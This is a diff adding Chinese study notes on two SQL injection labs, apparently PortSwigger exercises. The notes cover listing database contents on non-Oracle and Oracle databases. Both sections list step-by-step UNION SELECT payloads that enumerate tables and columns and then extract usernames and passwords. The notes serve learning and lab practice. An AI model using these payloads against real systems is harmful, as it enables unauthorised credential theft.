@@ -85,6 +85,27 @@
 
 ##总结：在只有一个回显位可用时需要将多个拼接为一个【挤挤总能放的下】
 
+##关卡九：SQL injection attack, listing the database contents on non-Oracle databases
+**目标**：拿到非Oracle数据库里的用户名，密码
+**攻击payload**:1.'+UNION+SELECT+'abc','def'--查看是否有回显位
+                2.'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--查所有表名
+                3.'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--查所有列名
+                4.'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--拿下管理员密码
+**原理**：1.'table_name':表名
+          2.'column_table':查列
+          3.'information_schema':数据库自带系统信息库
+
+##关卡十：SQL injection attack, listing the database contents on Oracle
+**目标**：拿到Oracle数据库里的用户名，密码
+**攻击payload**:1.'+UNION+SELECT+'abc','def'+FROM+dual--
+                2.'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+                3.'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+                4.'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+**原理**：1.同上，Oracle数据库要求更高，必须说明从哪里查'dual'
+          2.Oracle数据库用'all_tables','all_tab_columns'
+
+##总结：要拿到数据库里的用户名，密码，必须按数据库的规则来，先查所有表【看看都叫什么】，再查列【找到目标表，查列，看看这个表里有什么】，最后将列和表结合按数据库的规矩来【毕竟是人家的地盘】
+
 
 
 
